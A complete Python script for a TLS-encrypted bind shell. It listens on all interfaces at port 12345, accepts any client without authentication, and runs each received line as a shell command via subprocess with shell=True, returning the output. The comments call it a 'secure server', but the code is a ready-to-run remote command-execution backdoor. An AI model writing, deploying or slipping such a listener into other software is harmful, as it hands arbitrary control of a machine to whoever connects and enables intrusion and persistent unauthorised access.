import socket
import ssl
import subprocess

# Server configuration
host = "0.0.0.0"  # Listen on all interfaces
port = 12345

# SSL Configuration (Generate cert using OpenSSL: `openssl req -new -x509 -keyout server.key -out server.crt -days 365 -nodes`)
certfile = "server.crt"
keyfile = "server.key"

# Create socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((host, port))
server_socket.listen(5)

# Wrap socket with SSL
context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.load_cert_chain(certfile=certfile, keyfile=keyfile)

print(f"[*] Secure server listening on {host}:{port}")

while True:
    # Accept client connection
    client_socket, client_address = server_socket.accept()
    secure_socket = context.wrap_socket(client_socket, server_side=True)

    print(f"[+] Secure connection established from {client_address}")

    while True:
        try:
            # Receive command from client
            command = secure_socket.recv(1024).decode().strip()
            if not command or command.lower() == "exit":
                break  # Exit loop if client disconnects
            
            print(f"[Client]: {command}")

            # Execute command
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            response = output.stdout if output.stdout else output.stderr  # Send stdout or stderr

            # Send response to client
            secure_socket.send(response.encode() or b"No output\n")
        except Exception as e:
            secure_socket.send(f"Error: {str(e)}\n".encode())

    secure_socket.close()
    print(f"[-] Connection closed from {client_address}")
